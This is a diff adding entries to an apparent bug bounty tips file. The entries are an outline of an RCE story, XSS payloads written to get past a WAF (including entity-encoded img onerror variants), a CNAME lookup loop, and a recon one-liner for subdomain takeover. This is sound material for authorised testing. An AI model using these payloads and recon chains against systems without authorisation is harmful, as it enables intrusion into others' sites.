@@ -220,3 +220,48 @@ Account takeover
 Bug Bounty Tip for checking javascript files response which are stored in text file:
 
 cat js_files_url_list.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
+
+-----------------------------------------
+
+RCE story
+
+http://1.site.com/admin
+Forbidden
+2.HTTP header in request - Login page access
+3. Sqli queries tried no success
+4. Some recon on gitlab - Found base64 pwd - decrypt
+5. Accessed admin panel
+6. Admin panel customized - CLI available
+7. File read successful
+
+---------------------------------------
+
+<script>alert(1)</script> blocked by waf. 
+
+Let's try <script>alert`1`</script
+
+------------------------------------
+
+find cname records
+
+for ip in $(cat subdomain.txt);do dig asxf $ip | grep CNAME;done
+
+------------------
+
+evolution of an #xss WAF bypass 
+
+<img src onerror=confirm(1)>
+
+&gt;+src+onerror=confirm&lpar;1&rpar;&lt;
+
+&gt;+src+onerror=confirm&amp;lpar;1&amp;rpar;&lt;
+
+new tip: try double HTML entity encoding chars??? 
+
+-----------------------------------------------------
+
+Find subdomains and takeover
+Grinning face with smiling eyes
+
+
+subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/HAHWUL/tool/subjack/fingerprints.json -v 3 >> takeover ;
